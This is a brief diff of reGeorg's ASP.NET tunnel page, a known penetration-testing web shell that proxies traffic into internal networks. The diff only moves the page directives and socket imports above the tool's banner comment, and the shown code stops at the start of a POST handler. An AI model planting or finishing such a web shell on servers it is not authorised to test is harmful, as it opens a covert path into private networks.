@@ -1,4 +1,8 @@
-﻿/*                   _____                                    
+﻿<%@ Page Language="C#" EnableSessionState="True"%>
+<%@ Import Namespace="System.Net" %>
+<%@ Import Namespace="System.Net.Sockets" %>
+<%
+/*                   _____                                    
   _____   ______  __|___  |__  ______  _____  _____   ______  
  |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| 
  |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | 
@@ -23,10 +27,6 @@ to exist within your internal network.
 For more information, see:
 https://github.com/sensepost/reGeorg
 */
-<%@ Page Language="C#" EnableSessionState="True"%>
-<%@ Import Namespace="System.Net" %>
-<%@ Import Namespace="System.Net.Sockets" %>
-<%
     try
     {
         if (Request.HttpMethod == "POST")
